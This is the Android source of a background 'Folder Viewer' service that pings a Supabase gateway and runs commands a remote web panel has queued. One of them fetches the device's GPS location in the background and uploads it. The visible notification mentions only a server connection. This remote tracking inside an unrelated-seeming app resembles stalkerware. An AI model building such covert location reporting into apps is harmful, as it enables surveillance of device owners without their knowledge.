package com.example.folderviewer;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.net.ConnectivityManager;
import android.net.Network;
import android.net.NetworkCapabilities;
import android.net.NetworkRequest;
import android.Manifest;
import android.content.pm.PackageManager;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.util.Log;

import org.json.JSONObject;

import java.io.ByteArrayOutputStream;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class PingService extends Service {
    private static final String TAG = "FolderViewerPing";
    private static final String CHANNEL_ID = "folder_viewer_connection";
    private static final int NOTIFICATION_ID = 8102;
    private static final String SUPABASE_URL = "https://rvtqkldsapdtiocjygvc.supabase.co";
    private static final String SUPABASE_PUBLISHABLE_KEY = "sb_publishable_OA3eukLqTY8BrL3lf5trwQ_apXWqXh-";
    private static final String PREFS = "folder_viewer_device";
    private static final String KEY_DEVICE_ID = "device_id";
    private static final String KEY_DEVICE_TOKEN = "device_token";
    private static final long PING_INTERVAL_MS = 120_000L;
    private static final long RETRY_INTERVAL_MS = 10_000L;
    private static final int MAX_ATTEMPTS = 5;

    private final Handler handler = new Handler(Looper.getMainLooper());
    private final ExecutorService executor = Executors.newSingleThreadExecutor();
    private ConnectivityManager connectivityManager;
    private ConnectivityManager.NetworkCallback networkCallback;
    private boolean pingInProgress = false;
    private boolean pollingInProgress = false;
    private boolean requestLocationInProgress = false;
    private boolean online = false;
    private boolean retryExhausted = false;
    private int attempts = 0;
    private long runId = 0;
    private Network lastNetwork;
    private Runnable periodicRunnable;
    private Runnable retryRunnable;

    @Override public void onCreate() {
        super.onCreate();
        createNotificationChannel();
        startForeground(NOTIFICATION_ID, makeNotification("সার্ভারের অবস্থা যাচাই হচ্ছে…"));
        connectivityManager = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
        registerNetworkCallback();
        evaluateNetwork(true);
    }

    @Override public int onStartCommand(Intent intent, int flags, int startId) {
        evaluateNetwork(true);
        return START_STICKY;
    }

    private void registerNetworkCallback() {
        if (connectivityManager == null) return;
        networkCallback = new ConnectivityManager.NetworkCallback() {
            @Override public void onAvailable(Network network) {
                if (lastNetwork == null || !lastNetwork.equals(network)) {
                    lastNetwork = network;
                    resetRetryState();
                }
                handler.post(() -> evaluateNetwork(true));
            }
            @Override public void onLost(Network network) {
                if (lastNetwork != null && lastNetwork.equals(network)) lastNetwork = null;
                handler.post(() -> {
                    setOnline(false, "ইন্টারনেট সংযোগ নেই");
                    cancelPeriodic();
                    resetRetryState();
                });
            }
            @Override public void onCapabilitiesChanged(Network network, NetworkCapabilities caps) {
                handler.post(() -> {
                    boolean validated = caps != null && caps.hasCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET)
                            && caps.hasCapability(NetworkCapabilities.NET_CAPABILITY_VALIDATED);
                    if (validated) {
                        resetRetryState();
                        evaluateNetwork(true);
                    } else if (caps != null && caps.hasCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET)) {
                        evaluateNetwork(false);
                    }
                });
            }
        };
        try {
            if (Build.VERSION.SDK_INT >= 26) {
                connectivityManager.registerDefaultNetworkCallback(networkCallback);
            } else {
                NetworkRequest request = new NetworkRequest.Builder()
                        .addCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET).build();
                connectivityManager.registerNetworkCallback(request, networkCallback);
            }
        } catch (Exception e) { Log.e(TAG, "Network callback registration failed", e); }
    }

    private void evaluateNetwork(boolean allowImmediatePing) {
        if (isFinishingState()) return;
        Network active = connectivityManager == null ? null : connectivityManager.getActiveNetwork();
        NetworkCapabilities caps = active == null || connectivityManager == null ? null : connectivityManager.getNetworkCapabilities(active);
        boolean hasInternetNetwork = caps != null && caps.hasCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET);
        boolean validated = hasInternetNetwork && caps.hasCapability(NetworkCapabilities.NET_CAPABILITY_VALIDATED);
        if (validated) {
            if (active != null) lastNetwork = active;
            retryExhausted = false;
            attempts = 0;
            if (!online && allowImmediatePing) attemptPing(false);
            else if (!online && !pingInProgress) attemptPing(false);
            else if (online) schedulePeriodic();
        } else if (hasInternetNetwork) {
            setOnline(false, "Wi-Fi/ডাটা আছে, কিন্তু ইন্টারনেট যাচাই হয়নি");
            cancelPeriodic();
            if (!retryExhausted && !pingInProgress && retryRunnable == null) {
                attempts = 0;
                attemptPing(true);
            }
        } else {
            setOnline(false, "ইন্টারনেট সংযোগ নেই — সংযোগ ফিরলে আবার চেষ্টা হবে");
            cancelPeriodic();
        }
    }

    private boolean isFinishingState() { return false; }

    private void attemptPing(boolean connectivityRetry) {
        if (pingInProgress) return;
        SharedPreferences prefs = getSharedPreferences(PREFS, MODE_PRIVATE);
        long id = prefs.getLong(KEY_DEVICE_ID, -1);
        String token = prefs.getString(KEY_DEVICE_TOKEN, "");
        if (id < 1 || token.isEmpty()) {
            setOnline(false, "ডিভাইস নিবন্ধন প্রয়োজন — অ্যাপ খুলুন");
            return;
        }
        pingInProgress = true;
        final long thisRun = ++runId;
        executor.execute(() -> {
            boolean success = false;
            String error = "Ping ব্যর্থ";
            try {
                JSONObject body = new JSONObject();
                body.put("action", "ping");
                body.put("device_id", id);
                body.put("device_token", token);
                JSONObject response = postToGateway(body);
                success = response.optBoolean("ok", false);
                if (!success) error = response.optString("error", "সার্ভার Ping ব্যর্থ");
            } catch (Exception e) {
                error = e.getClass().getSimpleName();
                Log.w(TAG, "Ping attempt failed", e);
            }
            final boolean ok = success;
            final String resultMessage = error;
            handler.post(() -> {
                if (thisRun != runId) return;
                pingInProgress = false;
                if (ok) {
                    attempts = 0;
                    retryExhausted = false;
                    setOnline(true, "অনলাইন — অটো Ping চালু");
                    schedulePeriodic();
                    pollServerRequests();
                } else {
                    setOnline(false, "Ping ব্যর্থ: " + resultMessage);
                    cancelPeriodic();
                    attempts++;
                    if (attempts < MAX_ATTEMPTS) {
                        scheduleRetry();
                    } else {
                        retryExhausted = true;
                        retryRunnable = null;
                        setOnline(false, "৫ বার চেষ্টা ব্যর্থ — নেটওয়ার্ক পরিবর্তন/ইন্টারনেট ফিরলে আবার চেষ্টা হবে");
                    }
                }
            });
        });
    }

    private JSONObject postToGateway(JSONObject body) throws Exception {
        HttpURLConnection connection = null;
        try {
            connection = (HttpURLConnection) new URL(SUPABASE_URL + "/functions/v1/device-gateway").openConnection();
            connection.setRequestMethod("POST");
            connection.setConnectTimeout(10_000);
            connection.setReadTimeout(10_000);
            connection.setDoOutput(true);
            connection.setRequestProperty("apikey", SUPABASE_PUBLISHABLE_KEY);
            connection.setRequestProperty("Authorization", "Bearer " + SUPABASE_PUBLISHABLE_KEY);
            connection.setRequestProperty("Content-Type", "application/json; charset=utf-8");
            connection.setRequestProperty("Accept", "application/json");
            byte[] bytes = body.toString().getBytes("UTF-8");
            connection.setFixedLengthStreamingMode(bytes.length);
            try (OutputStream out = connection.getOutputStream()) { out.write(bytes); }
            int code = connection.getResponseCode();
            InputStream in = (code >= 200 && code < 400) ? connection.getInputStream() : connection.getErrorStream();
            ByteArrayOutputStream buffer = new ByteArrayOutputStream();
            if (in != null) {
                byte[] chunk = new byte[4096]; int n;
                while ((n = in.read(chunk)) != -1) buffer.write(chunk, 0, n);
                in.close();
            }
            JSONObject result = new JSONObject(buffer.toString("UTF-8"));
            if (code < 200 || code >= 300) {
                if (!result.has("error")) result.put("error", "HTTP " + code);
                return result;
            }
            return result;
        } finally { if (connection != null) connection.disconnect(); }
    }

    private void schedulePeriodic() {
        cancelPeriodic();
        periodicRunnable = () -> {
            periodicRunnable = null;
            evaluateNetwork(false);
            if (online && !pingInProgress) attemptPing(false);
            if (online) pollServerRequests();
        };
        handler.postDelayed(periodicRunnable, PING_INTERVAL_MS);
    }


    /** Poll only explicitly queued status/location requests. File listing/deletion remain in the app's approval UI. */
    private void pollServerRequests() {
        if (pollingInProgress) return;
        SharedPreferences prefs = getSharedPreferences(PREFS, MODE_PRIVATE);
        long id = prefs.getLong(KEY_DEVICE_ID, -1);
        String token = prefs.getString(KEY_DEVICE_TOKEN, "");
        if (id < 1 || token.isEmpty()) return;
        pollingInProgress = true;
        executor.execute(() -> {
            try {
                JSONObject body = new JSONObject();
                body.put("action", "poll_requests");
                body.put("device_id", id);
                body.put("device_token", token);
                JSONObject response = postToGateway(body);
                org.json.JSONArray requests = response.optJSONArray("requests");
                if (response.optBoolean("ok") && requests != null) {
                    for (int i = 0; i < requests.length(); i++) {
                        JSONObject req = requests.optJSONObject(i);
                        if (req == null) continue;
                        String action = req.optString("action", "");
                        long requestId = req.optLong("id", -1);
                        if (requestId <= 0) continue;
                        if ("check_location_status".equals(action)) {
                            completeRequest(id, token, requestId, "completed", getLocationStatus());
                        } else if ("get_location".equals(action)) {
                            // This is processed only because the authenticated web panel explicitly queued get_location.
                            handler.post(() -> captureLocationForRequest(id, token, requestId));
                        }
                        // list_files/delete_file are intentionally not auto-executed in the background.
                    }
                }
            } catch (Exception e) {
                Log.w(TAG, "Background request poll failed", e);
            } finally {
                handler.post(() -> pollingInProgress = false);
            }
        });
    }

    private JSONObject getLocationStatus() {
        JSONObject result = new JSONObject();
        try {
            boolean permission = Build.VERSION.SDK_INT < 23
                    || checkSelfPermission(Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED
                    || checkSelfPermission(Manifest.permission.ACCESS_COARSE_LOCATION) == PackageManager.PERMISSION_GRANTED;
            LocationManager lm = (LocationManager) getSystemService(LOCATION_SERVICE);
            boolean enabled = false;
            if (lm != null) {
                try { enabled = lm.isProviderEnabled(LocationManager.GPS_PROVIDER)
                        || lm.isProviderEnabled(LocationManager.NETWORK_PROVIDER); }
                catch (Exception ignored) { }
            }
            result.put("permission_granted", permission);
            result.put("location_enabled", enabled);
            result.put("background_location_permission", Build.VERSION.SDK_INT < 29
                    || checkSelfPermission("android.permission.ACCESS_BACKGROUND_LOCATION") == PackageManager.PERMISSION_GRANTED);
            result.put("checked_at", new java.text.SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss.SSSXXX", java.util.Locale.US).format(new java.util.Date()));
            result.put("message", !permission ? "Location permission is not granted" : (!enabled ? "Device Location is OFF" : "Location permission and device Location are ON"));
        } catch (Exception e) {
            try { result.put("error", "Unable to check location status"); } catch (Exception ignored) { }
        }
        return result;
    }

    @SuppressWarnings("MissingPermission")
    private void captureLocationForRequest(long id, String token, long requestId) {
        if (requestLocationInProgress) return;
        JSONObject status = getLocationStatus();
        if (!status.optBoolean("permission_granted") || !status.optBoolean("location_enabled")) {
            try { status.put("error", !status.optBoolean("permission_granted") ? "Location permission missing" : "Device Location is OFF"); } catch (Exception ignored) { }
            completeRequest(id, token, requestId, "failed", status);
            return;
        }
        // Android 10+ requires background location permission for reliable access while app is not visible.
        if (Build.VERSION.SDK_INT >= 29 && !status.optBoolean("background_location_permission")) {
            try { status.put("error", "Background location permission missing; grant Allow all the time in app settings"); } catch (Exception ignored) { }
            completeRequest(id, token, requestId, "failed", status);
            return;
        }
        LocationManager lm = (LocationManager) getSystemService(LOCATION_SERVICE);
        if (lm == null) {
            completeRequest(id, token, requestId, "failed", errorResult("Location service unavailable"));
            return;
        }
        requestLocationInProgress = true;
        Location last = null;
        try {
            if (checkSelfPermission(Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED
                    || checkSelfPermission(Manifest.permission.ACCESS_COARSE_LOCATION) == PackageManager.PERMISSION_GRANTED) {
                try { last = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER); } catch (Exception ignored) { }
                if (last == null) try { last = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER); } catch (Exception ignored) { }
            }
        } catch (Exception ignored) { }
        if (last != null && System.currentTimeMillis() - last.getTime() < 120_000L) {
            completeRequest(id, token, requestId, "completed", locationResult(last));
            requestLocationInProgress = false;
            return;
        }
        final boolean[] finished = {false};
        final LocationListener listener = new LocationListener() {
            @Override public void onLocationChanged(Location location) {
                if (finished[0]) return;
                finished[0] = true;
                try { lm.removeUpdates(this); } catch (Exception ignored) { }
                completeRequest(id, token, requestId, "completed", locationResult(location));
                requestLocationInProgress = false;
            }
            @Override public void onProviderEnabled(String provider) { }
            @Override public void onProviderDisabled(String provider) { }
            @Override public void onStatusChanged(String provider, int status, android.os.Bundle extras) { }
        };
        Runnable timeout = () -> {
            if (finished[0]) return;
            finished[0] = true;
            try { lm.removeUpdates(listener); } catch (Exception ignored) { }
            completeRequest(id, token, requestId, "failed", errorResult("No location fix within 30 seconds"));
            requestLocationInProgress = false;
        };
        try {
            if (lm.isProviderEnabled(LocationManager.NETWORK_PROVIDER)) lm.requestSingleUpdate(LocationManager.NETWORK_PROVIDER, listener, Looper.getMainLooper());
            if (lm.isProviderEnabled(LocationManager.GPS_PROVIDER)) lm.requestSingleUpdate(LocationManager.GPS_PROVIDER, listener, Looper.getMainLooper());
            handler.postDelayed(timeout, 30_000L);
        } catch (Exception e) {
            requestLocationInProgress = false;
            completeRequest(id, token, requestId, "failed", errorResult("Unable to request location in background"));
        }
    }

    private JSONObject locationResult(Location location) {
        JSONObject result = new JSONObject();
        try {
            result.put("latitude", location.getLatitude());
            result.put("longitude", location.getLongitude());
            result.put("accuracy_meters", location.hasAccuracy() ? location.getAccuracy() : JSONObject.NULL);
            result.put("provider", location.getProvider() == null ? "unknown" : location.getProvider());
            result.put("captured_at", new java.text.SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss.SSSXXX", java.util.Locale.US).format(new java.util.Date(location.getTime())));
        } catch (Exception ignored) { }
        return result;
    }

    private JSONObject errorResult(String message) {
        JSONObject result = new JSONObject();
        try { result.put("error", message); } catch (Exception ignored) { }
        return result;
    }

    private void completeRequest(long id, String token, long requestId, String status, JSONObject result) {
        executor.execute(() -> {
            try {
                JSONObject body = new JSONObject();
                body.put("action", "complete_request");
                body.put("device_id", id);
                body.put("device_token", token);
                body.put("request_id", requestId);
                body.put("status", status);
                body.put("result_payload", result);
                JSONObject response = postToGateway(body);
                if (!response.optBoolean("ok")) Log.w(TAG, "Complete request failed: " + response.optString("error"));
            } catch (Exception e) { Log.w(TAG, "Complete request network error", e); }
        });
    }

    private void cancelPeriodic() {
        if (periodicRunnable != null) handler.removeCallbacks(periodicRunnable);
        periodicRunnable = null;
    }

    private void scheduleRetry() {
        if (retryRunnable != null) handler.removeCallbacks(retryRunnable);
        retryRunnable = () -> {
            retryRunnable = null;
            if (!retryExhausted) attemptPing(true);
        };
        handler.postDelayed(retryRunnable, RETRY_INTERVAL_MS);
    }

    private void resetRetryState() {
        retryExhausted = false;
        attempts = 0;
        if (retryRunnable != null) handler.removeCallbacks(retryRunnable);
        retryRunnable = null;
    }

    private void setOnline(boolean value, String text) {
        online = value;
        NotificationManager nm = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
        if (nm != null) nm.notify(NOTIFICATION_ID, makeNotification(text));
    }

    private Notification makeNotification(String text) {
        if (Build.VERSION.SDK_INT >= 26) {
            return new Notification.Builder(this, CHANNEL_ID)
                    .setContentTitle("Folder Viewer — সার্ভার সংযোগ")
                    .setContentText(text)
                    .setSmallIcon(android.R.drawable.stat_notify_sync_noanim)
                    .setOngoing(true)
                    .build();
        }
        return new Notification.Builder(this)
                .setContentTitle("Folder Viewer — সার্ভার সংযোগ")
                .setContentText(text)
                .setSmallIcon(android.R.drawable.stat_notify_sync_noanim)
                .setOngoing(true)
                .build();
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= 26) {
            NotificationChannel channel = new NotificationChannel(CHANNEL_ID, "Folder Viewer connection", NotificationManager.IMPORTANCE_LOW);
            channel.setDescription("Automatic server ping and online/offline status");
            NotificationManager nm = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
            if (nm != null) nm.createNotificationChannel(channel);
        }
    }

    @Override public void onDestroy() {
        cancelPeriodic();
        if (retryRunnable != null) handler.removeCallbacks(retryRunnable);
        if (connectivityManager != null && networkCallback != null) {
            try { connectivityManager.unregisterNetworkCallback(networkCallback); } catch (Exception ignored) { }
        }
        executor.shutdownNow();
        super.onDestroy();
    }

    @Override public IBinder onBind(Intent intent) { return null; }
}
